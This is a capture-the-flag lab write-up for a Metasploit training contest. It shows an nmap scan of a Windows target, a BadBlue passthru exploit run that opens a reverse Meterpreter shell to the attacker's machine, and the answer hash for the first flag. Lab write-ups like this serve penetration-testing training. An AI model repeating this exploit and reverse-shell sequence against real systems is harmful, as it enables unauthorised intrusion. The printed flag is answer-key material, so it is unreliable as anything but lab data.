# Metasploit CTF: [Dec 18 - Dec 22]

## Mission

### CTF Description:

The CTF is focused on exploiting vulnerable applications and windows components exploitation. Explore the services, applications on the running machine, identify the misconfiguration flaw then and leverage it to obtain a shell on the target. Once you have a shell, escalate privileges and perform Lateral movement to compromise the second machine on the network. 

### Objective:

Collect all nine flags.

### Level:

Beginner

### Instructions:

Click on RUN to start the lab (takes approximately 90s).

Click on LAB LINK to access the Kali GUI instance. The machine will have an interface with IP address 10.X.X.X. 

Target machine A and Target machine B should be located at the IP address 10.X.X.X. and 10.X.X.X. respectively. 

Once you compromise Target A, you should be able to exploit Target B.

Some flags can be identified by prefix flag*. Please read the flag description carefully to know the type of the flag. Also, CTF flags can be gained in any order.

All the tools required for solving the CTF are available on the Kali machine. Third-party opensource tools/scripts are present in the directory "/root/Desktop/tools"

For performing dictionary attack use the wordlist: /root/Desktop/wordlists/100-common-passwords.txt

### Practice Labs:


https://attackdefense.com/challengedetails?cid=2110

https://attackdefense.com/challengedetails?cid=1945

https://attackdefense.com/challengedetails?cid=2025


### Note: The lab has a one-hour timer for auto termination. Please keep saving your commands, snapshots, etc.

### Rules:

Capture and verify 9 flags

Once you verify the flags, email attackdefense@pentesteracademy.com with a short report on the process and the email you used to register on this website + your Twitter handle for winners' announcement.

Reply to our Twitter post to let us know you've submitted your report. 

This CTF contest will start on 0000hrs Dec 18, 2020, ET and end on 2359hrs Dec 22, 2020, ET.

The first person to capture all the flags gets an Ember Smart Mug + 1-month subscription + Pentester Academy T-shirt
Second and third to capture all the flags will get a 1-month subscription + Pentester Academy T-shirt

3 other participants who capture all the flags will be selected randomly to win a 1-month subscription These will be picked randomly from the remaining correct submissions coming in up to 2359hrs Dec 22, 2020, ET

Winners will be contacted on Dec 23-24, 2020

All decisions from our team will be final. 

## Notes

- **Target Machine IP Address 1** - 10.4.28.62
- **Target Machine IP Address 2** - 10.4.24.52


## nmap for 10.4.28.62

    root@attackdefense:~# sudo nmap -p- -vv -T4 -sC -sV 10.4.28.62 
    
    Discovered open port 3389/tcp on 10.4.28.62
    Discovered open port 135/tcp on 10.4.28.62
    Discovered open port 139/tcp on 10.4.28.62
    Discovered open port 445/tcp on 10.4.28.62
    Discovered open port 49666/tcp on 10.4.28.62
    Discovered open port 49671/tcp on 10.4.28.62
    Discovered open port 49667/tcp on 10.4.28.62
    Discovered open port 49672/tcp on 10.4.28.62
    Discovered open port 47001/tcp on 10.4.28.62
    Discovered open port 49665/tcp on 10.4.28.62
    Discovered open port 5985/tcp on 10.4.28.62
    Discovered open port 49664/tcp on 10.4.28.62
    Discovered open port 49669/tcp on 10.4.28.62
    Discovered open port 49668/tcp on 10.4.28.62
    PORT      STATE SERVICE       REASON          VERSION
    135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds? syn-ack ttl 125
    3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: ATTACKDEFENSE
    |   NetBIOS_Domain_Name: ATTACKDEFENSE
    |   NetBIOS_Computer_Name: ATTACKDEFENSE
    |   DNS_Domain_Name: AttackDefense
    |   DNS_Computer_Name: AttackDefense
    |   Product_Version: 10.0.17763
    |_  System_Time: 2022-04-05T20:54:01+00:00
    | ssl-cert: Subject: commonName=AttackDefense
    | Issuer: commonName=AttackDefense
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2022-04-04T20:47:11
    | Not valid after:  2022-10-04T20:47:11
    | MD5:   7a65 c0f5 d7ff 0b3f 1ad4 b186 97b9 bda4
    | SHA-1: 27da ab58 ab02 6e95 1dd8 85a0 6e7d 5eb0 716d b568
    | -----BEGIN CERTIFICATE-----
    | MIIC3jCCAcagAwIBAgIQUSybZHIlaoZI5vgHyTawZDANBgkqhkiG9w0BAQsFADAY
    | MRYwFAYDVQQDEw1BdHRhY2tEZWZlbnNlMB4XDTIyMDQwNDIwNDcxMVoXDTIyMTAw
    | NDIwNDcxMVowGDEWMBQGA1UEAxMNQXR0YWNrRGVmZW5zZTCCASIwDQYJKoZIhvcN
    | AQEBBQADggEPADCCAQoCggEBAK7elXUkHlUba5sM1IvgN6/ktXXXR+Tff47/NxQk
    | 77QmSuwXm1TZrC3Jc98NLTpraKsEP4gUh7fxVuXdDmwrURdNJnkbnOv6P1HekNvi
    | IpuBGB+x6rDAv4/DclCXTNxtCADGXAxdQ8yAVPmfzRbFmtg6LGEnpwNFDey9yrkj
    | Tjp6YoruBgJcr4sf+Ospt0qaEIadYTlzhJeNLg6pWjP68wG2EUSwXEOY+Gd6vSsQ
    | QyRHwrNvxOIo7/DFCvcFNx5P8/BgFXIGdvFxdjjnE46Lp96OZhESExJaOasSAM8U
    | rMPTDizKPxK3AKk2EP4gtE0pfBiyKD+Bpi9RRmP17WIGGqkCAwEAAaMkMCIwEwYD
    | VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IB
    | AQA+bsLrWID0K0PxjIAYHxNzDHR46IXzxRM3P1f5OfgT7/dZSvb+44auMrEdl+d8
    | WF53ksQs4gbt8/EzKbbkkYDUbgC8beiifWyb8/9j9r/xvvfifqjqdldikDMrJSyB
    | J6dQLDtdOG01dkSD0P4SgKLOwvblc86YNElThMPiq2f1jULHj+71mgwJ3milYo/0
    | sNDAIRHc6oc7Z4d/IKHL9LM/5nCNzm507r51sJJrBVuOoWK2tk6EGJFQe81CNIFQ
    | yRA3jIpjsGNrIylnXhxVnPj+mqqJqluI3XoBr3YmSo5vDyCTRXF+O76yvfxY+W/m
    | 0+POy6um38GoEzEYw/yp3wEg
    |_-----END CERTIFICATE-----
    |_ssl-date: 2022-04-05T20:54:08+00:00; 0s from scanner time.
    5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    49672/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 0s, deviation: 0s, median: 0s
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 26438/tcp): CLEAN (Couldn't connect)
    |   Check 2 (port 28184/tcp): CLEAN (Couldn't connect)
    |   Check 3 (port 42674/udp): CLEAN (Timeout)
    |   Check 4 (port 23419/udp): CLEAN (Failed to receive data)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2022-04-05T20:54:05
    |_  start_date: N/A

## nmap for 10.4.24.52

No connections open when scanning from Kali Box

## msfconsole 10.4.28.62

    msf6 exploit(windows/http/badblue_passthru) > run

    [*] Started reverse TCP handler on 10.10.3.2:4444 
    [*] Trying target BadBlue EE 2.7 Universal...
    [*] Sending stage (175174 bytes) to 10.4.28.62
    [*] Meterpreter session 1 opened (10.10.3.2:4444 -> 10.4.28.62:49785) at 2022-04-06 02:29:49 +0530

    meterpreter > getuid
    Server username: ATTACKDEFENSE\httpuser

## Flags

### Flag 1

    meterpreter > dir
    Listing: C:\Users\httpuser\Desktop
    ==================================

    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----
    100666/rw-rw-rw-  282   fil   2020-12-14 10:58:59 +0530  desktop.ini
    100666/rw-rw-rw-  32    fil   2020-12-14 11:56:27 +0530  flag1.txt

    meterpreter > cat flag1.txt 
    ba9aa248c9c28a050a9780a455c97a64